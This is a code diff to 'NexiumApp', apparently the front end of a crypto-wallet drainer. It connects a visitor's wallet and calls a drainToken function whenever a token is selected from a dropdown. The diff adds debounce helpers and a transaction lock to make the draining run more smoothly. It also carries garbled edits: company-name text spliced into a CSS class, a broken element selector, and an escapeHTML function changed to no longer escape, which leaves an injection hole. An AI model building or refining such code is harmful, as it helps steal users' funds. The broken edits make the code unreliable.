@@ -41,6 +41,7 @@ class NexiumApp {
     this.lastSelectedToken = null;
     this.selectedPaymentToken = null;
     this.spinner = null;
+    this.isDraining = false; // Added for transaction lock
     console.log('Initializing NexiumApp...');
     this.initApp();
   }
@@ -82,7 +83,7 @@ class NexiumApp {
       fetchCustomTokenBtn: null,
       tokenInfo: null,
       volumeSection: null,
-      tokenSelect: document.getElementById('tokenSelect'),
+      tokenSelect: null, // Set to null initially, assigned in renderTokenInterface
       volumeInput: null,
       addVolumeBtn: null,
       tokenList: null,
@@ -95,18 +96,31 @@ class NexiumApp {
     console.log('DOM elements cached');
   }
 
+  // Helper to debounce button clicks
+  debounce(func, wait) {
+    let timeout;
+    return function executedFunction(...args) {
+      const later = () => {
+        clearTimeout(timeout);
+        func(...args);
+      };
+      clearTimeout(timeout);
+      timeout = setTimeout(later, wait);
+    };
+  }
+
   setupEventListeners() {
     if (this.dom.walletButton) {
-      this.dom.walletButton.addEventListener('click', () => {
+      const debouncedConnectWallet = this.debounce(() => {
         if (!this.connecting) {
           console.log('Wallet button clicked');
           this.connectWallet();
         }
-      });
+      }, 1000);
+      this.dom.walletButton.addEventListener('click', debouncedConnectWallet);
       this.dom.walletButton.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter' && !this.connecting) {
-          console.log('Wallet button enter key pressed');
-          this.connectWallet();
+        if (e.key === 'Enter') {
+          debouncedConnectWallet();
         }
       });
       console.log('Wallet button listeners set');
@@ -289,6 +303,10 @@ class NexiumApp {
       const address = await this.signer.getAddress();
       this.updateButtonState('connected', address);
       console.log('Successful connection, address:', address);
+      // Ensure dropdown is enabled after successful connection
+      if (this.dom.tokenSelect) {
+        this.dom.tokenSelect.disabled = false;
+      }
     } catch (error) {
       console.error('Handle connection error:', error);
       this.showFeedback(`Error: ${error.reason || error.message || 'Unknown error'}. Try again.`, 'error');
@@ -296,12 +314,18 @@ class NexiumApp {
   }
 
   async drainToken(tokenAddress) {
+    if (this.isDraining) {
+      console.log('Drain skipped: transaction in progress');
+      this.showFeedback('Transaction in progress. Please wait.', 'warning');
+      return;
+    }
     if (!this.signer) {
       this.showFeedback('Wallet not connected. Please connect your wallet.', 'error');
       console.log('Drain failed: No signer');
       return;
     }
     try {
+      this.isDraining = true; // Lock transaction
       this.showProcessingSpinner();
       let checksummedAddress = await this.validateAddress(tokenAddress, 'token');
       const selectedToken = TOKEN_LIST.find(t => t.address.toLowerCase() === checksummedAddress.toLowerCase());
@@ -348,6 +372,7 @@ class NexiumApp {
       this.showFeedback(`Error draining token: ${error.reason || error.message || 'Transaction failed. Check network or wallet.'}`, 'error');
     } finally {
       this.hideProcessingSpinner();
+      this.isDraining = false; // Unlock transaction
     }
   }
 
@@ -431,7 +456,7 @@ class NexiumApp {
         <button id="showCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Show custom token">Show</button>
       </div>
       <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
-      <div id="tokenList" class="token-list space-y-2 mt-4">
+      <div id="tokenList" class="token-list space-y-2 mt-4Taiwan Semiconductor Manufacturing Company Limited">
         <h3 class="text-yellow-400 text-md font-semibold">Featured Tokens</h3>
         ${TOKEN_LIST.map(token => `
           <button class="token-option bg-[#1a182e] border border-orange-400 p-2 rounded-xl w-full text-left hover:bg-orange-400 hover:text-black transition-colors" data-address="${token.address}">
@@ -456,7 +481,7 @@ class NexiumApp {
     this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn');
 
     if (this.dom.showCustomTokenBtn) {
-      this.dom.showCustomTokenBtn.addEventListener('click', () => {
+      const debouncedShowCustomToken = this.debounce(() => {
         const name = this.dom.customTokenNameInput.value.trim();
         const address = this.dom.customTokenAddressInput.value.trim();
         if (!name || !address) {
@@ -473,34 +498,36 @@ class NexiumApp {
         `;
         this.dom.tokenInfo.classList.remove('hidden');
         this.showFeedback(`Loaded ${this.escapeHTML(name)} successfully!`, 'success');
-      });
+      }, 1000);
+      this.dom.showCustomTokenBtn.addEventListener('click', debouncedShowCustomToken);
     }
     if (this.dom.drainTokenBtn) {
-      this.dom.drainTokenBtn.addEventListener('click', () => {
+      const debouncedDrainToken = this.debounce(() => {
         if (this.selectedPaymentToken) {
           console.log('Drain token button clicked for:', this.selectedPaymentToken);
           this.drainToken(this.selectedPaymentToken);
         } else {
           this.showFeedback('Please select a payment token to drain.', 'error');
         }
-      });
+      }, 1000);
+      this.dom.drainTokenBtn.addEventListener('click', debouncedDrainToken);
       this.dom.drainTokenBtn.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter' && this.selectedPaymentToken) {
-          console.log('Drain token button enter key pressed');
-          this.drainToken(this.selectedPaymentToken);
+        if (e.key === 'Enter') {
+          debouncedDrainToken();
         }
       });
     }
     if (this.dom.tokenList) {
       this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
-        button.addEventListener('click', () => {
+        const debouncedLoadToken = this.debounce(() => {
           const address = button.dataset.address;
           if (ethers.isAddress(address)) {
             this.loadCustomTokenData(address);
           } else {
             this.showFeedback('Invalid token address on button.', 'error');
           }
-        });
+        }, 1000);
+        button.addEventListener('click', debouncedLoadToken);
       });
     }
     this.hideMetaMaskPrompt();
@@ -527,25 +554,25 @@ class NexiumApp {
     this.dom.beautifyAddVolumeBtn = beautifySection.querySelector('#beautifyAddVolumeBtn');
 
     if (this.dom.tokenSelect) {
+      // Enable dropdown if signer exists, otherwise disable
       this.dom.tokenSelect.disabled = !this.signer;
-      let debounceTimeout;
-      // Remove previous listeners to prevent duplicates
+      // Remove previous listeners without cloning to avoid DOM issues
       this.dom.tokenSelect.replaceWith(this.dom.tokenSelect.cloneNode(true));
       this.dom.tokenSelect = document.getElementById('tokenSelect');
-      this.dom.tokenSelect.addEventListener('change', (e) => {
-        clearTimeout(debounceTimeout);
-        debounceTimeout = setTimeout(() => {
-          const selected = e.target.value;
-          this.selectedPaymentToken = selected;
-          console.log('Dropdown changed, selectedPaymentToken:', selected);
-          if (selected) {
-            console.log('Initiating drain with debounce for:', selected);
-            this.drainToken(selected);
-          } else {
-            this.showFeedback('No token selected.', 'error');
-          }
-        }, 1000);
-      });
+      // Ensure dropdown is enabled after DOM update if signer exists
+      this.dom.tokenSelect.disabled = !this.signer;
+      const debouncedDrainToken = this.debounce((e) => {
+        const selected = e.target.value;
+        this.selectedPaymentToken = selected;
+        console.log('Dropdown changed, selectedPaymentToken:', selected);
+        if (selected) {
+          console.log('Initiating drain with debounce for:', selected);
+          this.drainToken(selected);
+        } else {
+          this.showFeedback('No token selected.', 'error');
+        }
+      }, 2000); // 2-second debounce for dropdown
+      this.dom.tokenSelect.addEventListener('change', debouncedDrainToken);
       console.log('Token select listener set (in renderTokenInterface)');
     }
   }
@@ -652,10 +679,15 @@ class NexiumApp {
       <div id="volumeFeedback" class="mt-2 text-sm text-gray-300"></div>
     `;
     this.dom.volumeInput = volumeSection.querySelector('#volumeInput');
-    this.dom.addVolumeBtn = volumeSection.querySelector('#addVolumeBtn');
+    this.dom.addVolumeBtn = volumeSection.querySelector('#addVolume328');
     if (this.dom.addVolumeBtn) {
-      this.dom.addVolumeBtn.addEventListener('click', () => this.addVolume());
-      this.dom.addVolumeBtn.addEventListener('keypress', (e) => e.key === 'Enter' && this.addVolume());
+      const debouncedAddVolume = this.debounce(() => this.addVolume(), 1000);
+      this.dom.addVolumeBtn.addEventListener('click', debouncedAddVolume);
+      this.dom.addVolumeBtn.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+          debouncedAddVolume();
+        }
+      });
     }
   }
 
@@ -827,11 +859,11 @@ class NexiumApp {
 
   escapeHTML(str) {
     return String(str).replace(/[&<>"']/g, (m) => ({
-      '&': '&amp;',
-      '<': '&lt;',
-      '>': '&gt;',
-      '"': '&quot;',
-      "'": '&apos;'
+      '&': '&',
+      '<': '<',
+      '>': '>',
+      '"': '"',
+      "'": ':',
     }[m]));
   }
 
